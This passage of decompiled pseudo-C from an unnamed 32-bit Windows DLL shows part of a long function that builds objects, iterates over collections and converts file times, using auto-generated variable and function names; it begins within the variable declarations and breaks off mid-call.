  wchar_t *v4; // ecx
  int v5; // eax
  wchar_t *v6; // ecx
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // ecx
  wchar_t *v22; // ecx
  LONG *v23; // eax
  wchar_t *v24; // ecx
  LONG *v25; // eax
  int v26; // ecx
  void (__thiscall **v27)(int, int); // esi
  int v28; // eax
  int v29; // ecx
  _DWORD *v30; // esi
  _DWORD *v31; // eax
  int *v32; // ecx
  int v33; // eax
  void *v34; // eax
  int v35; // eax
  _DWORD *v36; // eax
  _DWORD *v37; // eax
  int *v38; // ecx
  int *v39; // ecx
  volatile LONG *v40; // ecx
  volatile LONG *v41; // ecx
  int v42; // eax
  void *v43; // eax
  int v44; // eax
  _DWORD *v45; // eax
  _DWORD *v46; // eax
  int *v47; // ecx
  int *v48; // ecx
  int *v49; // ecx
  DWORD v50; // ecx
  _DWORD *v51; // eax
  void *v52; // esi
  _DWORD *v53; // eax
  void *v54; // eax
  int v55; // eax
  _DWORD *v56; // eax
  wchar_t *v57; // eax
  wchar_t *v58; // eax
  wchar_t *v59; // eax
  wchar_t *v60; // eax
  wchar_t *v61; // eax
  wchar_t *v62; // eax
  _DWORD *v63; // eax
  _DWORD *v64; // eax
  _DWORD *v65; // eax
  int *v66; // ecx
  int *v67; // ecx
  _DWORD *v68; // eax
  _DWORD *v69; // eax
  int *v70; // ecx
  int *v71; // ecx
  _DWORD *v72; // eax
  _DWORD *v73; // eax
  int *v74; // ecx
  int *v75; // ecx
  DWORD v76; // ecx
  int *v77; // ecx
  int v78; // eax
  int *v79; // ecx
  DWORD v80; // ecx
  int v81; // eax
  void *v82; // eax
  int v83; // eax
  _DWORD *v84; // eax
  _DWORD *v85; // eax
  int *v86; // ecx
  int *v87; // ecx
  int *v88; // ecx
  DWORD v89; // ecx
  int v90; // eax
  void *v91; // eax
  int v92; // eax
  _DWORD *v93; // eax
  _DWORD *v94; // eax
  int *v95; // ecx
  int *v96; // ecx
  int *v97; // ecx
  DWORD v98; // ecx
  int v99; // eax
  _DWORD *v100; // eax
  _DWORD *v101; // eax
  int *v102; // ecx
  _DWORD *v103; // edi
  int *v104; // ecx
  int *v105; // ecx
  int *v106; // ecx
  int *v107; // ecx
  _DWORD *v108; // eax
  _DWORD *v109; // eax
  int *v110; // ecx
  int *v111; // ecx
  int *v112; // ecx
  DWORD v113; // ecx
  int v114; // eax
  int *v115; // ecx
  DWORD v116; // ecx
  _DWORD *v117; // eax
  int *v118; // ecx
  int *v119; // ecx
  int *v120; // ecx
  int *v121; // ecx
  int *v122; // ecx
  int v123; // eax
  int *v124; // ecx
  bool v125; // al
  char dwHighDateTime; // bl
  char v127; // [esp-5Ch] [ebp-680h]
  char v128; // [esp-58h] [ebp-67Ch]
  int v129; // [esp-50h] [ebp-674h]
  int v130; // [esp-4Ch] [ebp-670h]
  unsigned int v131; // [esp-4Ch] [ebp-670h]
  volatile LONG *v132; // [esp-48h] [ebp-66Ch] BYREF
  volatile LONG *v133; // [esp-44h] [ebp-668h]
  volatile LONG *v134; // [esp-40h] [ebp-664h] BYREF
  volatile LONG *v135; // [esp-3Ch] [ebp-660h]
  int v136; // [esp-38h] [ebp-65Ch]
  int v137; // [esp-34h] [ebp-658h]
  __int64 v138; // [esp-30h] [ebp-654h] BYREF
  int v139; // [esp-28h] [ebp-64Ch] BYREF
  int *v140; // [esp-24h] [ebp-648h]
  struct _FILETIME v141; // [esp-20h] [ebp-644h] BYREF
  int *v142; // [esp-18h] [ebp-63Ch] BYREF
  int *v143; // [esp-14h] [ebp-638h]
  int v144; // [esp-10h] [ebp-634h] BYREF
  wchar_t *v145; // [esp-Ch] [ebp-630h] BYREF
  wchar_t *v146; // [esp-8h] [ebp-62Ch] BYREF
  wchar_t *v147; // [esp-4h] [ebp-628h]
  int v148; // [esp+10h] [ebp-614h] BYREF
  int v149[30]; // [esp+14h] [ebp-610h] BYREF
  int v150[2]; // [esp+8Ch] [ebp-598h] BYREF
  int v151[5]; // [esp+94h] [ebp-590h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+A8h] [ebp-57Ch] BYREF
  int v153[7]; // [esp+B8h] [ebp-56Ch] BYREF
  int v154[4]; // [esp+D4h] [ebp-550h] BYREF
  int v155[4]; // [esp+E4h] [ebp-540h] BYREF
  struct _FILETIME v156; // [esp+F4h] [ebp-530h]
  FILETIME FileTime; // [esp+FCh] [ebp-528h] BYREF
  int v158[4]; // [esp+104h] [ebp-520h] BYREF
  int v159[4]; // [esp+114h] [ebp-510h] BYREF
  int v160[4]; // [esp+124h] [ebp-500h] BYREF
  int v161; // [esp+134h] [ebp-4F0h] BYREF
  int *v162; // [esp+138h] [ebp-4ECh]
  int v163[4]; // [esp+144h] [ebp-4E0h] BYREF
  int v164[4]; // [esp+154h] [ebp-4D0h] BYREF
  int v165[2]; // [esp+164h] [ebp-4C0h] BYREF
  void *v166[2]; // [esp+16Ch] [ebp-4B8h] BYREF
  void *v167[2]; // [esp+174h] [ebp-4B0h] BYREF
  void *v168[2]; // [esp+17Ch] [ebp-4A8h] BYREF
  void *v169[2]; // [esp+184h] [ebp-4A0h] BYREF
  void *v170[2]; // [esp+18Ch] [ebp-498h] BYREF
  void *v171[2]; // [esp+194h] [ebp-490h] BYREF
  void *v172[2]; // [esp+19Ch] [ebp-488h] BYREF
  void *v173[2]; // [esp+1A4h] [ebp-480h] BYREF
  void *v174[2]; // [esp+1ACh] [ebp-478h] BYREF
  void *v175[2]; // [esp+1B4h] [ebp-470h] BYREF
  _DWORD v176[2]; // [esp+1BCh] [ebp-468h] BYREF
  int v177[4]; // [esp+1C4h] [ebp-460h] BYREF
  void *v178[2]; // [esp+1D4h] [ebp-450h] BYREF
  void *v179[2]; // [esp+1DCh] [ebp-448h] BYREF
  void *v180[2]; // [esp+1E4h] [ebp-440h] BYREF
  void *v181[2]; // [esp+1ECh] [ebp-438h] BYREF
  _DWORD v182[2]; // [esp+1F4h] [ebp-430h] BYREF
  void *v183[2]; // [esp+1FCh] [ebp-428h] BYREF
  void *v184[2]; // [esp+204h] [ebp-420h] BYREF
  void *v185[2]; // [esp+20Ch] [ebp-418h] BYREF
  void *v186[2]; // [esp+214h] [ebp-410h] BYREF
  void *v187[2]; // [esp+21Ch] [ebp-408h] BYREF
  int v188[4]; // [esp+224h] [ebp-400h] BYREF
  int v189; // [esp+234h] [ebp-3F0h] BYREF
  void *v190; // [esp+238h] [ebp-3ECh]
  void *v191[2]; // [esp+23Ch] [ebp-3E8h] BYREF
  void *v192[2]; // [esp+244h] [ebp-3E0h] BYREF
  _DWORD v193[2]; // [esp+24Ch] [ebp-3D8h] BYREF
  int v194[2]; // [esp+254h] [ebp-3D0h] BYREF
  void *v195[2]; // [esp+25Ch] [ebp-3C8h] BYREF
  _DWORD v196[2]; // [esp+264h] [ebp-3C0h] BYREF
  _DWORD v197[2]; // [esp+26Ch] [ebp-3B8h] BYREF
  int v198[2]; // [esp+274h] [ebp-3B0h] BYREF
  int *v199; // [esp+27Ch] [ebp-3A8h] BYREF
  volatile LONG *v200; // [esp+280h] [ebp-3A4h]
  __int64 v201; // [esp+284h] [ebp-3A0h] BYREF
  int v202; // [esp+28Ch] [ebp-398h] BYREF
  int v203; // [esp+290h] [ebp-394h]
  __int64 v204; // [esp+294h] [ebp-390h] BYREF
  struct HKEY__ phkResult; // [esp+29Ch] [ebp-388h] BYREF
  int v206; // [esp+2A4h] [ebp-380h] BYREF
  void *v207; // [esp+2A8h] [ebp-37Ch]
  char v208[4]; // [esp+2ACh] [ebp-378h] BYREF
  volatile LONG *v209; // [esp+2B0h] [ebp-374h]
  _DWORD v210[2]; // [esp+2B4h] [ebp-370h] BYREF
  _DWORD v211[2]; // [esp+2BCh] [ebp-368h] BYREF
  wchar_t *v212; // [esp+2C4h] [ebp-360h] BYREF
  volatile LONG *lpAddend; // [esp+2C8h] [ebp-35Ch]
  int *v214; // [esp+2CCh] [ebp-358h]
  struct _FILETIME v215; // [esp+2D0h] [ebp-354h] BYREF
  int v216; // [esp+2D8h] [ebp-34Ch] BYREF
  void *v217; // [esp+2DCh] [ebp-348h]
  int v218; // [esp+2E0h] [ebp-344h]
  void *v219; // [esp+2E4h] [ebp-340h]
  int v220[206]; // [esp+2E8h] [ebp-33Ch] BYREF
  int v221; // [esp+620h] [ebp-4h]

  v214 = a1;
  v218 = 0;
  sub_10029BC2((__int32)a1);
  sub_1000132C(v153);
  v1 = operator new(0x90u);
  v215.dwHighDateTime = (DWORD)v1;
  v221 = 0;
  if ( v1 )
    v3 = sub_1002FE95(*(_DWORD *)(dword_101842F4 + 16), v2, (int)v1);
  else
    v3 = 0;
  v221 = -1;
  sub_1000728E(&v212, v3);
  v221 = 1;
  v215.dwHighDateTime = (DWORD)&v146;
  v147 = (wchar_t *)lpAddend;
  v146 = v212;
  InterlockedIncrement(lpAddend);
  LOBYTE(v221) = 1;
  sub_10028A48((int)v146);
  sub_1000D17D(v198, &word_1017898C);
  LOBYTE(v221) = 3;
  v147 = v4;
  v146 = v4;
  v215.dwHighDateTime = (DWORD)&v146;
  sub_1000728E(&v146, 0);
  LOBYTE(v221) = 3;
  sub_1004F292((_DWORD *)dword_10182DE8, 0, (int)v198, (int)v146, (int)v147);
  LOBYTE(v221) = 1;
  sub_1000D3AD(v198);
  LOBYTE(v221) = 5;
  sub_1004DDEE(&v148, (_DWORD *)(dword_101842F4 + 182), (void *)(dword_101842F4 + 198));
  LOBYTE(v221) = 6;
  sub_10006814(v163);
  LOBYTE(v221) = 7;
  sub_100185CD((void *)(dword_101842F4 + 162), (int)v179);
  LOBYTE(v221) = 8;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v179[0] + 4))(v179[0]) )
  {
    v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)v179[0] + 12))(v179[0]);
    sub_1000D372(&phkResult, v5);
    LOBYTE(v221) = 9;
    if ( *(_BYTE *)(dword_101842F4 + 160)
      && (*(unsigned __int8 (__thiscall **)(int *, struct HKEY__ *))(v149[0] + 8))(v149, &phkResult) )
    {
      if ( sub_1004E439((__int32)&v148, &v148, &phkResult) )
      {
        v146 = v6;
        v145 = v6;
        v215.dwHighDateTime = (DWORD)&v145;
        sub_1000728E(&v145, 0);
        LOBYTE(v221) = 9;
        sub_1004F292((_DWORD *)dword_10182DE8, 117, (int)&phkResult, (int)v145, (int)v146);
      }
    }
    sub_10007469(v163, (int)&phkResult);
    LOBYTE(v221) = 8;
    sub_1000D3AD(&phkResult.unused);
    sub_10021F56(v7, (int)v179[0]);
  }
  LOBYTE(v221) = 7;
  sub_10007D7A(v179);
  sub_10006814(v154);
  LOBYTE(v221) = 11;
  sub_100185CD((void *)(dword_101842F4 + 350), (int)v166);
  LOBYTE(v221) = 12;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v166[0] + 4))(v166[0]) )
  {
    v8 = (*(int (__thiscall **)(void *))(*(_DWORD *)v166[0] + 12))(v166[0]);
    sub_10007469(v154, v8);
    sub_10021F56(v9, (int)v166[0]);
  }
  LOBYTE(v221) = 11;
  sub_10007D7A(v166);
  sub_10006814(&v161);
  LOBYTE(v221) = 13;
  sub_100185CD((void *)(dword_101842F4 + 268), (int)v172);
  LOBYTE(v221) = 14;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v172[0] + 4))(v172[0]) )
  {
    v10 = (*(int (__thiscall **)(void *))(*(_DWORD *)v172[0] + 12))(v172[0]);
    sub_10007469(&v161, v10);
    sub_10021F56(v11, (int)v172[0]);
  }
  LOBYTE(v221) = 13;
  sub_10007D7A(v172);
  sub_10006814(v158);
  LOBYTE(v221) = 15;
  sub_100185CD((void *)(dword_101842F4 + 284), (int)v168);
  LOBYTE(v221) = 16;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v168[0] + 4))(v168[0]) )
  {
    v12 = (*(int (__thiscall **)(void *))(*(_DWORD *)v168[0] + 12))(v168[0]);
    sub_10007469(v158, v12);
    sub_10021F56(v13, (int)v168[0]);
  }
  LOBYTE(v221) = 15;
  sub_10007D7A(v168);
  sub_10006814(v155);
  LOBYTE(v221) = 17;
  sub_100185CD((void *)(dword_101842F4 + 76), (int)v170);
  LOBYTE(v221) = 18;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v170[0] + 4))(v170[0]) )
  {
    v14 = (*(int (__thiscall **)(void *))(*(_DWORD *)v170[0] + 12))(v170[0]);
    sub_10007469(v155, v14);
    sub_10021F56(v15, (int)v170[0]);
  }
  LOBYTE(v221) = 17;
  sub_10007D7A(v170);
  sub_10006814(v159);
  LOBYTE(v221) = 19;
  sub_100185CD((void *)(dword_101842F4 + 375), (int)v175);
  LOBYTE(v221) = 20;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v175[0] + 4))(v175[0]) )
  {
    v16 = (*(int (__thiscall **)(void *))(*(_DWORD *)v175[0] + 12))(v175[0]);
    sub_10007469(v159, v16);
    sub_10021F56(v17, (int)v175[0]);
  }
  LOBYTE(v221) = 19;
  sub_10007D7A(v175);
  sub_10006814(v160);
  LOBYTE(v221) = 21;
  sub_100185CD((void *)(dword_101842F4 + 321), (int)v173);
  LOBYTE(v221) = 22;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v173[0] + 4))(v173[0]) )
  {
    v18 = (*(int (__thiscall **)(void *))(*(_DWORD *)v173[0] + 12))(v173[0]);
    sub_10007469(v160, v18);
    sub_10021F56(v19, (int)v173[0]);
  }
  LOBYTE(v221) = 21;
  sub_10007D7A(v173);
  sub_10006814(v188);
  LOBYTE(v221) = 23;
  sub_100185CD((void *)(dword_101842F4 + 92), (int)v171);
  LOBYTE(v221) = 24;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v171[0] + 4))(v171[0]) )
  {
    v20 = (*(int (__thiscall **)(void *))(*(_DWORD *)v171[0] + 12))(v171[0]);
    sub_10007469(v188, v20);
    sub_10021F56(v21, (int)v171[0]);
  }
  LOBYTE(v221) = 23;
  sub_10007D7A(v171);
  sub_100077CD(&v199);
  LOBYTE(v221) = 25;
  if ( *(_DWORD *)(dword_101842F4 + 56) == 2
    && (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)(dword_101842F4 + 60) + 64))(dword_101842F4 + 60)
    && sub_10014AF7((int)dword_10186A88) )
  {
    sub_1000D17D(v198, &word_10178990);
    LOBYTE(v221) = 26;
    v147 = v22;
    v146 = v22;
    v215.dwHighDateTime = (DWORD)&v146;
    sub_1000728E(&v146, 0);
    LOBYTE(v221) = 26;
    sub_1004F292((_DWORD *)dword_10182DE8, 2, (int)v198, (int)v146, (int)v147);
    LOBYTE(v221) = 25;
    sub_1000D3AD(v198);
    LOBYTE(v221) = 28;
    v23 = (LONG *)operator new(0x20u);
    v24 = v147;
    v215.dwHighDateTime = (DWORD)v23;
    LOBYTE(v221) = 29;
    if ( v23 )
      v25 = sub_100342DE(v23);
    else
      v25 = 0;
    LOBYTE(v221) = 28;
    v147 = v24;
    v146 = v24;
    v215.dwHighDateTime = (DWORD)&v146;
    sub_1000728E(&v146, (int)v25);
    LOBYTE(v221) = 30;
    v145 = (wchar_t *)v26;
    v144 = v26;
    v217 = &v144;
    sub_1000D372(&v144, (int)dword_10186A88);
    LOBYTE(v221) = 31;
    v143 = sub_10006814(v197);
    LOBYTE(v221) = 33;
    sub_10035659((int)v220, v143, v144, (int)v145, v146, v147);
    LOBYTE(v221) = 35;
    sub_100068A5(v197);
    sub_100358D6((int)v220);
    sub_10035C02(v220, v194);
    LOBYTE(v221) = 36;
    if ( v194[1] == 1 )
    {
      v27 = (void (__thiscall **)(int, int))(*(_DWORD *)(dword_101842F4 + 60) + 36);
      v28 = (*(int (__thiscall **)(int *, _DWORD))(v194[0] + 44))(v194, 0);
      (*v27)(dword_101842F4 + 60, v28);
      sub_10014B0E(dword_10186A88);
      v145 = (wchar_t *)v29;
      v144 = v29;
      v215.dwHighDateTime = (DWORD)&v144;
      sub_1000728E(&v144, 0);
      LOBYTE(v221) = 37;
      v30 = (_DWORD *)dword_10182DE8;
      v143 = 0;
      v142 = (int *)(*(int (__thiscall **)(int *))(v194[0] + 44))(v194);
      LOBYTE(v221) = 36;
      sub_1004F292(v30, 3, (int)v142, 0, v144);
    }
    LOBYTE(v221) = 35;
    sub_100068A5(v194);
    LOBYTE(v221) = 28;
    sub_1002ACC3(v220);
    v221 = 25;
  }
  sub_1002A306((__int32)v164, v164, *(void **)(dword_101842F4 + 56), (void *)(dword_101842F4 + 60));
  LOBYTE(v221) = 41;
  if ( v164[3] )
  {
    v31 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD))(v164[0] + 44))(v164, 0);
    sub_10011AE0(v31, v176);
    LOBYTE(v221) = 42;
    v143 = v32;
    v142 = v32;
    v215.dwHighDateTime = (DWORD)&v142;
    sub_10011AE0(v176, &v142);
    LOBYTE(v221) = 42;
    sub_1002A5E0((__int32)v208, (void **)&v199, v208, hEvent, v155, 0, v142, (wchar_t *)v143);
    LOBYTE(v221) = 44;
    v217 = operator new(0x20u);
    LOBYTE(v221) = 45;
    if ( v217 )
    {
      v215.dwHighDateTime = (DWORD)&v142;
      v143 = (int *)v200;
      v142 = v199;
      InterlockedIncrement(v200);
      LOBYTE(v221) = 45;
      v33 = sub_100287DB((int)v217, (int)v142, v143);
    }
    else
    {
      v33 = 0;
    }
    LOBYTE(v221) = 44;
    sub_10039112(&v201, v33);
    LOBYTE(v221) = 47;
    FileTime = sub_1002A02D(*(_DWORD *)(dword_101842F4 + 337));
    memset(&SystemTime, 0, sizeof(SystemTime));
    if ( FileTimeToSystemTime(&FileTime, &SystemTime) )
    {
      v202 = *(_DWORD *)&SystemTime.wYear;
      v203 = *(_DWORD *)&SystemTime.wDayOfWeek;
      v204 = *(_QWORD *)&SystemTime.wHour;
      v34 = operator new(0x3Cu);
      v215.dwHighDateTime = (DWORD)v34;
      LOBYTE(v221) = 48;
      if ( v34 )
        v35 = sub_1002EBDD(v154, (int)v34, &FileTime, v188, 0);
      else
        v35 = 0;
      LOBYTE(v221) = 47;
      sub_1000728E(v165, v35);
      LOBYTE(v221) = 49;
      v36 = operator new(0x1Cu);
      v215.dwHighDateTime = (DWORD)v36;
      LOBYTE(v221) = 50;
      if ( v36 )
        v37 = sub_100289DB(v36);
      else
        v37 = 0;
      LOBYTE(v221) = 49;
      sub_10039112(v181, (int)v37);
      LOBYTE(v221) = 51;
      v143 = v38;
      v142 = v38;
      v215.dwHighDateTime = (DWORD)&v142;
      sub_1000A205(v165, &v142);
      LOBYTE(v221) = 51;
      sub_10028920((_DWORD *)v181[0], (char)v142, (int)v143);
      sub_1000728E(v198, 0);
      LOBYTE(v221) = 53;
      v143 = v39;
      v142 = v39;
      v215.dwHighDateTime = (DWORD)&v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = 53;
      sub_10028920((_DWORD *)v181[0], (char)v142, (int)v143);
      LOBYTE(v221) = 51;
      sub_1000780D(v198);
      v217 = operator new(0x68u);
      LOBYTE(v221) = 55;
      if ( v217 )
      {
        v215.dwHighDateTime = (DWORD)&v142;
        v143 = (int *)v200;
        v142 = v199;
        InterlockedIncrement(v200);
        LOBYTE(v221) = 56;
        v190 = &v139;
        sub_1000809E(v163, &v139);
        LOBYTE(v221) = 57;
        v136 = v202;
        v137 = v203;
        v138 = v204;
        sub_1000728E(v195, 0);
        LOBYTE(v221) = 58;
        v218 |= 1u;
        v135 = v40;
        v134 = v40;
        v207 = &v134;
        sub_1002D137((int *)v181, &v134);
        v221 = 59;
        v133 = v41;
        v132 = v41;
        v219 = &v132;
        sub_1000A205(&v212, &v132);
        LOBYTE(v221) = 60;
        v130 = *(_DWORD *)(dword_101842F4 + 345);
        v129 = *(_DWORD *)(dword_101842F4 + 341);
        v128 = *(_BYTE *)(dword_101842F4 + 349);
        v127 = *(_BYTE *)(dword_101842F4 + 161);
        LOBYTE(v221) = 61;
        v42 = sub_1002E794(
                (int)v217,
                v127,
                v128,
                hEvent,
                v129,
                v130,
                (int)v132,
                v133,
                (int)v134,
                v135,
                v136,
                v137,
                v138,
                SHIDWORD(v138),
                v139,
                (int)v140,
                v141.dwLowDateTime,
                v141.dwHighDateTime,
                (int)v142,
                v143);
      }
      else
      {
        v42 = 0;
      }
      v221 = 62;
      sub_1000728E(v198, v42);
      v221 = 64;
      if ( (v218 & 1) != 0 )
      {
        v218 &= ~1u;
        sub_1000780D(v195);
      }
      v156 = sub_1002A02D(*(_DWORD *)(dword_101842F4 + 156));
      v215 = v156;
      v43 = operator new(0x3Cu);
      v219 = v43;
      LOBYTE(v221) = 65;
      if ( v43 )
        v44 = sub_1002EBDD(v163, (int)v43, &v215, v188, 0);
      else
        v44 = 0;
      LOBYTE(v221) = 64;
      sub_10039112(v178, v44);
      LOBYTE(v221) = 66;
      v45 = operator new(0x1Cu);
      v219 = v45;
      LOBYTE(v221) = 67;
      if ( v45 )
        v46 = sub_100289DB(v45);
      else
        v46 = 0;
      LOBYTE(v221) = 66;
      sub_10039112(v185, (int)v46);
      LOBYTE(v221) = 68;
      sub_1000728E(v195, 0);
      LOBYTE(v221) = 69;
      v143 = v47;
      v142 = v47;
      v219 = &v142;
      sub_1002D137((int *)v178, &v142);
      LOBYTE(v221) = 69;
      sub_10028920((_DWORD *)v185[0], (char)v142, (int)v143);
      LOBYTE(v221) = 68;
      sub_1000780D(v195);
      sub_1000728E(v195, 0);
      LOBYTE(v221) = 71;
      v143 = v48;
      v142 = v48;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = 71;
      sub_10028920((_DWORD *)v185[0], (char)v142, (int)v143);
      LOBYTE(v221) = 68;
      sub_1000780D(v195);
      v217 = operator new(0x38u);
      LOBYTE(v221) = 73;
      if ( v217 )
      {
        sub_1000728E(v195, 0);
        LOBYTE(v221) = 74;
        v218 |= 2u;
        v143 = v49;
        v142 = v49;
        v219 = &v142;
        sub_1002D137((int *)v185, &v142);
        v221 = 75;
        v141.dwHighDateTime = v50;
        v141.dwLowDateTime = v50;
        v207 = &v141;
        sub_1000A205(&v212, &v141);
        LOBYTE(v221) = 76;
        v51 = (_DWORD *)sub_1000838A(&v148, (int)&v202);
        LOBYTE(v221) = 77;
        v218 |= 4u;
        v140 = (int *)*(unsigned __int8 *)(dword_101842F4 + 161);
        v139 = (int)hEvent;
        HIDWORD(v138) = v51;
        LODWORD(v138) = (unsigned int)(1000 * *(_DWORD *)(dword_101842F4 + 4)) >> 1;
        v221 = 78;
        v52 = (void *)sub_1002EE31(
                        (int)v217,
                        200,
                        v138,
                        v51,
                        (int *)hEvent,
                        (char)v140,
                        v141.dwLowDateTime,
                        (volatile LONG *)v141.dwHighDateTime,
                        (int)v142,
                        v143);
      }
      else
      {
        v52 = 0;
      }
      v221 = 80;
      v53 = operator new(4u);
      v219 = v53;
      v221 = 81;
      if ( v53 )
        *v53 = 1;
      else
        v53 = 0;
      v174[1] = v53;
      v174[0] = v52;
      v221 = 83;
      if ( (v218 & 4) != 0 )
      {
        v218 &= ~4u;
        sub_100068A5(&v202);
      }
      LOBYTE(v221) = 84;
      if ( (v218 & 2) != 0 )
      {
        v218 &= ~2u;
        sub_1000780D(v195);
      }
      v54 = operator new(0x3Cu);
      v219 = v54;
      LOBYTE(v221) = 85;
      if ( v54 )
        v55 = sub_1002EBDD(v158, (int)v54, &v215, v188, 0);
      else
        v55 = 0;
      LOBYTE(v221) = 84;
      sub_10039112(v195, v55);
      LOBYTE(v221) = 86;
      v217 = operator new(0x44u);
      LOBYTE(v221) = 87;
      if ( v217 )
        v56 = sub_1002E6B6(
                &v161,
                v217,
                &v215,
                v188,
                *(_DWORD *)(dword_101842F4 + 260),
                *(_DWORD *)(dword_101842F4 + 264));
      else
        v56 = 0;
      LOBYTE(v221) = 86;
      sub_10039112(v186, (int)v56);
      LOBYTE(v221) = 88;
      sub_10006814(v177);
      LOBYTE(v221) = 89;
      v57 = (wchar_t *)sub_1000CC40((int)&unk_10178998);
      sub_1000D17D(&v204, v57);
      LOBYTE(v221) = 90;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v58 = (wchar_t *)sub_1000CC40((int)&unk_101789C8);
      sub_1000D17D(&v204, v58);
      LOBYTE(v221) = 91;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v59 = (wchar_t *)sub_1000CC40((int)&unk_101789FC);
      sub_1000D17D(&v204, v59);
      LOBYTE(v221) = 92;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v60 = (wchar_t *)sub_1000CC40((int)&unk_10178A2C);
      sub_1000D17D(&v204, v60);
      LOBYTE(v221) = 93;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v61 = (wchar_t *)sub_1000CC40((int)&unk_10178A5C);
      sub_1000D17D(&v204, v61);
      LOBYTE(v221) = 94;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v62 = (wchar_t *)sub_1000CC40((int)&unk_10178A8C);
      sub_1000D17D(&v204, v62);
      LOBYTE(v221) = 95;
      sub_10007469(v177, (int)&v204);
      LOBYTE(v221) = 89;
      sub_1000D3AD((int *)&v204);
      v217 = operator new(0x44u);
      LOBYTE(v221) = 96;
      if ( v217 )
        v63 = sub_1002E6B6(
                v177,
                v217,
                &v215,
                v188,
                *(_DWORD *)(dword_101842F4 + 260),
                *(_DWORD *)(dword_101842F4 + 264));
      else
        v63 = 0;
      LOBYTE(v221) = 89;
      sub_1000728E(&v204, (int)v63);
      LOBYTE(v221) = 97;
      v64 = operator new(0x1Cu);
      v219 = v64;
      LOBYTE(v221) = 98;
      if ( v64 )
        v65 = sub_1002ABD3(v64);
      else
        v65 = 0;
      LOBYTE(v221) = 97;
      sub_10039112(v184, (int)v65);
      LOBYTE(v221) = 99;
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 100;
      v143 = v66;
      v142 = v66;
      v219 = &v142;
      sub_1002D137((int *)v186, &v142);
      LOBYTE(v221) = 100;
      sub_10028920((_DWORD *)v184[0], (char)v142, (int)v143);
      LOBYTE(v221) = 99;
      sub_1000780D(v210);
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 102;
      v143 = v67;
      v142 = v67;
      v219 = &v142;
      sub_1002D137((int *)v195, &v142);
      LOBYTE(v221) = 102;
      sub_10028920((_DWORD *)v184[0], (char)v142, (int)v143);
      LOBYTE(v221) = 99;
      sub_1000780D(v210);
      v68 = operator new(0x1Cu);
      v219 = v68;
      LOBYTE(v221) = 104;
      if ( v68 )
        v69 = sub_100289DB(v68);
      else
        v69 = 0;
      LOBYTE(v221) = 99;
      sub_10039112(&phkResult, (int)v69);
      LOBYTE(v221) = 105;
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 106;
      v143 = v70;
      v142 = v70;
      v219 = &v142;
      sub_1002D137((int *)v184, &v142);
      LOBYTE(v221) = 106;
      sub_10028920((_DWORD *)phkResult.unused, (char)v142, (int)v143);
      LOBYTE(v221) = 105;
      sub_1000780D(v210);
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 108;
      v143 = v71;
      v142 = v71;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = 108;
      sub_10028920((_DWORD *)phkResult.unused, (char)v142, (int)v143);
      LOBYTE(v221) = 105;
      sub_1000780D(v210);
      v72 = operator new(0x1Cu);
      v219 = v72;
      LOBYTE(v221) = 110;
      if ( v72 )
        v73 = sub_100289DB(v72);
      else
        v73 = 0;
      LOBYTE(v221) = 105;
      sub_10039112(v180, (int)v73);
      LOBYTE(v221) = 111;
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 112;
      v143 = v74;
      v142 = v74;
      v219 = &v142;
      sub_1002D137((int *)v186, &v142);
      LOBYTE(v221) = 112;
      sub_10028920((_DWORD *)v180[0], (char)v142, (int)v143);
      LOBYTE(v221) = 111;
      sub_1000780D(v210);
      sub_1000728E(v210, 0);
      LOBYTE(v221) = 114;
      v143 = v75;
      v142 = v75;
      v219 = &v142;
      sub_1002D137((int *)&v201, &v142);
      LOBYTE(v221) = 114;
      sub_10028920((_DWORD *)v180[0], (char)v142, (int)v143);
      LOBYTE(v221) = 111;
      sub_1000780D(v210);
      v217 = operator new(0x3Cu);
      LOBYTE(v221) = 116;
      if ( v217 )
      {
        v142 = v143;
        v219 = &v142;
        sub_1000A205(&v204, &v142);
        LOBYTE(v221) = 117;
        sub_1000728E(v182, 0);
        LOBYTE(v221) = 118;
        v218 |= 8u;
        v141.dwHighDateTime = v76;
        v141.dwLowDateTime = v76;
        v207 = &v141;
        sub_1002D137(&phkResult.unused, &v141);
        v221 = 119;
        v140 = v77;
        v139 = (int)v77;
        v190 = &v139;
        sub_1000A205(&v212, &v139);
        LOBYTE(v221) = 120;
        HIDWORD(v138) = hEvent;
        LODWORD(v138) = 200;
        v133 = *(volatile LONG **)(dword_101842F4 + 243);
        v134 = *(volatile LONG **)(dword_101842F4 + 247);
        v135 = *(volatile LONG **)(dword_101842F4 + 251);
        v136 = *(_DWORD *)(dword_101842F4 + 255);
        LOBYTE(v137) = *(_BYTE *)(dword_101842F4 + 259);
